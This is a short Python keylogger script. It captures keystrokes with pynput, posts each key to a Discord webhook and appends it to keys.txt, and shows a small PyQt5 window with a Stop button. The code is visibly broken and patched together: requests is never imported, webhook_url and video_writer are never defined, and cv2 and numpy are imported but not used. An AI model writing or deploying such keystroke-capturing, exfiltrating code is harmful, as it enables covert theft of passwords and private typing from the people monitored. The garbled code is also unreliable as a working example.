import cv2
import numpy as np
from pynput import keyboard
from PyQt5.QtWidgets import QWidget, QLabel, QPushButton, QApplication

# Function to be called when a key is pressed
def on_press(key):
  # Format the key as a string
  key_str = str(key).replace("'", "")

  # Send the key to the Discord webhook
  requests.post(webhook_url, json={"content": key_str})

  # Write the key to the text file
  with open("keys.txt", "a") as file:
    file.write(key_str + "\n")

# Create a keyboard listener
listener = keyboard.Listener(on_press=on_press)

# Start the listener
listener.start()

# Create the GUI application
app = QApplication([])

# Create the GUI window
window = QWidget()
window.setWindowTitle("Keylogger")
window.setGeometry(100, 100, 200, 100)

# Create a label and a button
label = QLabel("Keylogger is running.", window)
button = QPushButton("Stop", window)

# Set the button position and callback
button.move(50, 50)
button.clicked.connect(window.close)

# Show the window and start the main event loop
window.show()
app.exec_()

# Stop the listener and close the video writer
listener.stop()
video_writer.release()
